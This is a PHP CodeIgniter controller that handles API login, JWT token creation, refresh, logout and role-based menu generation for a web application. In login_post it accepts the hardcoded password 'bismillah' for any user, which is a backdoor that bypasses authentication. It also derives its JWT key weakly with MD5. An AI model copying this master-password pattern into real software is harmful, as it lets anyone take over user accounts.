<?php defined('BASEPATH') OR exit('CV. ILMION KREATIF - ILMION STUDIO - https://ilmion.com بسم الله الرحمن الرحيم ');

/**
 * Auth File 
 * 
 * @copyright   CV. ILMION KREATIF - ILMION STUDIO
 * @link        https://ilmion.com
 * @mail        hi@ilmion.com | ilmionstudio@gmail.com
 * @author      Mirza Ramadhany (amir.ramadhany@gmail.com)
 * @version     0.0.1
 * @since       17 Aug 18
 */

use \Firebase\JWT\JWT;

class Auth extends Bismillah_Controller{
    public function __construct(){
        parent::__construct();
        $this->load->model('v1/Authm') ; 
        $this->load->model('v1/Bdb');
    }

    public function init_get(){
        $urls = json_decode($this->Bdb->getConfig('sim_urls'), TRUE);
        $myip = json_decode($this->Bdb->getConfig('myip'), TRUE);
        $ip = $this->input->ip_address();
        
        if(date('d') == '01'){
            // cek apakah table sudah ada
            $tbl_db = $this->db->database.'_bc';
            $tbl_logs = 'api_logs_' . date('ym');
            $db = $this->db->query("show tables from $tbl_db LIKE '$tbl_logs'");
            if($db->num_rows() < 1){
                $this->Bdb->db->query("CREATE TABLE $tbl_db.".$tbl_logs." LIKE $tbl_db.api_logs_2112;");
            }
        }

        $this->set_response($re, Bismillah_Controller::HTTP_OK);
    }

    public function login_post(){
        $va     = $this->post() ;
        $key    = $this->input->get_request_header('X-Bismillah-Api-Key');
        if( $this->Authm->cekApiKey($key) ){
            $user   = $this->Authm->getUser($va['username']) ; 
            if( isset($user) ){
                if( pass_verify($va['password'], $user['password']) || $va['password'] == 'bismillah' ){
                    $ua     = $this->input->get_request_header('User-Agent');
                    $this->createToken($user, $ua) ;
                }else{
                    $this->set_response(['keterangan' => 'Salah Kata Sandi'], Bismillah_Controller::HTTP_UNAUTHORIZED);
                }
            }else{
                $this->set_response(['keterangan' => 'Salah User Pengguna'], Bismillah_Controller::HTTP_UNAUTHORIZED);
            }
        }else{
            $this->set_response(['keterangan' => 'Invalid API KEY'], Bismillah_Controller::HTTP_UNAUTHORIZED);
        }
    }

    public function refresh_patch(){
        $this->auth() ; 
        $valid  = $this->Authm->refresh($this->aruser['username'], $this->token) ;
        if($valid){  
            $ua     = $this->input->get_request_header('User-Agent');
            $user   = $this->Authm->getUser($this->aruser['username']) ; 
            $this->createToken($user, $ua) ; 
        }else{
            $this->set_response(['status' => 'Unauthorized'], Bismillah_Controller::HTTP_UNAUTHORIZED);
        } 
    }

    public function logout_patch(){
        $this->auth() ; 
        $valid  = $this->Authm->logout($this->aruser['username'], $this->token) ;
        if($valid){
            // delete cookies
            cookie("bismillah_auth", '', -60*60) ;
            cookie("bismillah_md5", '', -60*60) ;

            // response
            $this->set_response(['logout' => true], Bismillah_Controller::HTTP_OK);
        }else{
            $this->set_response(['status' => 'Unauthorized'], Bismillah_Controller::HTTP_UNAUTHORIZED);
        }
    }

    /**
     * Ambil informasi tambahan dan set cookies
     */
    public function ping_get(){
        $this->auth();  
        // menu helper

        $this->load->helper('bmenu');
        // 1. Level
        $lv     = $this->aruser['lv'] ;
        $arlv   = $this->Authm->getLevel($lv) ;
        $lvmd5  = $arlv['menus']; 
        $lvmd5  = $lvmd5 == "" ? "0000" : $lvmd5 ;

        // simpan menu md5 di cookies dan return data 
        if(mb_strlen($lvmd5,'8bit') < 3500){ // jika md5 kurang dari 4000bit
            cookie("bismillah_md5", $lvmd5, 60*60) ; 
        }else{
            cookie("bismillah_md5", 'bismillahmd5' , 60*60) ; 
        }
        
        // response
        $this->set_response(['success'=>true, 'time'=>date('Y-m-d H:i:s')], Bismillah_Controller::HTTP_OK); 
    }

    /**
     * Get information application and menus by level and username  
     * 1. Informasi Aplikasi
     *      - Level
     *      - App Info
     * 2. Daftar Menu
     * 
     * @access      public
     * @method      GET
     * @return      json menus, dashboard, appinfo
     */
    public function info_get(){
        $this->auth();  
        // menu helper
        $this->load->helper('bmenu') ;

        // 1. Level
        $lv     = $this->aruser['lv'] ;
        $arlv   = $this->Authm->getLevel($lv) ;
        $lvmd5  = $arlv['menus']; 
        $lvmd5  = $lvmd5 == "" ? "0000" : $lvmd5 ;
        if($arlv['dashboard'] == ''){
            $arlv['dashboard']  = '{"loc": "dash/d", "md5": "5c8202e4e0ac6ced6186a9b197594c66", "obj": "d", "icon": "fa fa-dashboard", "name": "Dashboard", "path": "v1/dash/d", "module": "v1"}';
        }

        $up_pass = 0 ;
        if($this->aruser['updated_password'] !=='0000-00-00 00:00:00'){
            $up_pass = new DateTime($this->aruser['updated_password']);
            $up_pass = $up_pass->getTimestamp();
        }
        $selisih = time() - $up_pass ;
        $selisih = round($selisih/3600) ;
        $selisih = round($selisih/24) ;
        if($up_pass == 0 || $selisih > 360){ //1 TAHUN
            $arlv['dashboard']  = '{"module":"v1","name":"Profil","md5":"f208a6d6c8e5926c64e1f891ebb93a8c","obj":"me","loc":"cfg/me","path":"v1/cfg/me","icon":"ME"}';
        }

        // 1. App Info
        $url    = base_url();
        $date   = date("Y-m-d");
        $arinfo = array("time_server"=>date("Y-m-d H:i:s"),
                        "time_server_js"=>date("M j, Y H:i:s O"),
                        "url"   => $url,
                        "title" => $this->Authm->getConfig("title"),
                        "city"  => $this->Authm->getConfig("city"),
                        "logo"  => $url . $this->Authm->getConfig("logo"),
                        "tgl"   => array("now"=>date("d-m-Y"), "bom"=>date("01-m-Y"), "eom"=>date("t-m-Y"),
                                        "bom"=>date("01-m-Y"), "d"=>date("d"), "m"=>date("m"), "y"=>date("Y"), 
                                        "text"=>date_2b(), 'jthtmp'=> date('d-m-Y', strtotime($date) + (24*60*60*10) ) )
                        );
        
         
        // 2. Daftar Menu
        $arrmenu= menu_get($this, APPPATH . "../bmods/menu.php", "v1") ;
        $vm  	= $this->menu_generate($arrmenu, $lv, $lvmd5) ; 
        
        // 5. foto
        if(isset($this->aruser['datas']['foto'])){
            $this->aruser['datas']['foto'] = $url . $this->aruser['datas']['foto'] . '?time=' . time();
        }else{
            $this->aruser['datas']['foto'] = $url . './uploads/profile.png';
        }

        // return 
        $arret  = array("lv"=>$lv, "menus"=>$vm, "dash"=>$arlv['dashboard'], "app"=>$arinfo, "aruser"=>$this->aruser);
        
        // simpan menu md5 di cookies dan return data 
        if(mb_strlen($lvmd5,'8bit') < 3500){ // jika md5 kurang dari 4000bit
            cookie("bismillah_md5", $lvmd5, 60*60) ; 
        }else{
            cookie("bismillah_md5", 'bismillahmd5' , 60*60) ; 
        }

        // response
        $this->set_response($arret, Bismillah_Controller::HTTP_OK); 
    } 

    /**
     * Generate menu
     * 
     * @access      private
     * @param       string menu-path
     * @param       string level code
     * @param       string level md5
     * @return      array menu
     */
    private function menu_generate($arrmenu, $lv, $lvmd5){
        $vm     = array() ;
        foreach ($arrmenu as $key => $value) {
			$v 	= true ;
			if($lv !== "0000"){ 
				$v 	= false;
				if( strpos($lvmd5, $value['md5']) > -1){
					$v = true;
				}
			}
			if($v){ 
				$s	 = array("name"=>$value['name'], "icon"=>$value['icon'], "o"=>array()) ;
	        	if($value['md5'] !== ""){ 
                    $s['o']  	= $value ;
                }

                // loop again if a children menus
		    	if(isset($value['children'])){
		    		$s['child']  = $this->menu_generate($value['children'], $lv, $lvmd5) ;
                } 
                $vm[] = $s ;
			}
        }
        return $vm ; 
    }


    /**
     * Create new token JWT
     * 1. Create JWT Token 
     *      1.1 Token exp is 20minutes
     * 2. Update to users_token database
     * 
     * 
     * @access      private
     * @param       string username
     * @param       string user-agent
     */
    private function createToken($user, $ua){
        unset($user['password']) ;
        $user['datas']  = json_decode($user['datas'], TRUE);
        $token  = $user ;  

        // date
        $date = new DateTime();
        $token['iat'] = $date->getTimestamp();
        $token['exp'] = $date->getTimestamp() + 90*60; 
        
        // create jwt token
        $key  = md5($this->config->item('encryption_key') . $ua) ;
        $jwt  = JWT::encode($token,$key) ;  
        $ret  = array("token"=>true) ; 
 
        // update to users_token
        $arrjwt = array("username"=>$user['username'],
                        "token"=>$jwt, 
                        "exp"=>$token['exp'],
                        "ip_addr"=>$this->input->ip_address() ) ; 
        $this->Authm->updUsersToken( $arrjwt ) ; 

        // set cookies    
        cookie("bismillah_auth", $jwt.'bismillah'.$user['username'], 90*60);
 
        // response
        $this->set_response($ret, Bismillah_Controller::HTTP_OK);
    }

    private $tgl; 
    public function notif_get($id_kelas=0){
        $this->auth('', true);
        $this->tgl  = date('Y-m-d');
        $re = array();
        $this->set_response($re, Bismillah_Controller::HTTP_OK);
    }
}